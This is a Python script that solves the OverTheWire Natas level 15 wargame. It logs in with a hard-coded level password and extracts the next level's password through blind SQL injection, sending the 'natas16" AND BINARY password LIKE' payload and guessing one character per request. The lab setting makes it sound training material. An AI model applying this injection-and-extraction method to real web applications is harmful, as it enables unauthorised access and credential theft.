import requests
import re
import string

chars = string.ascii_lowercase + string.ascii_uppercase + string.digits

username = "natas15"
password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"
url = "http://%s.natas.labs.overthewire.org/"  % username

session = requests.Session()

response = session.get(url,auth=(username,password))
print(response.text)
print("="*50)

source = "index-source.html"
response = session.get(url+source,auth=(username,password))
print(response.text)
print("="*50)

# Starting the bruteforcing of the password letter by letter
seen_password = list()
sql_like_injection ='natas16" AND BINARY password LIKE"'
while(len(seen_password) != 32):
	for character in chars:
		print("trying " + "".join(seen_password) + character)
		response = session.post(url,auth=(username,password),data={"username":sql_like_injection + "".join(seen_password) + character + '%"#'})
		pageContent = response.text
		if re.findall("This user exists.",pageContent):
			seen_password.append(character)
			break
print("="*50)
print("\nThe password for the next level is: " + "".join(seen_password))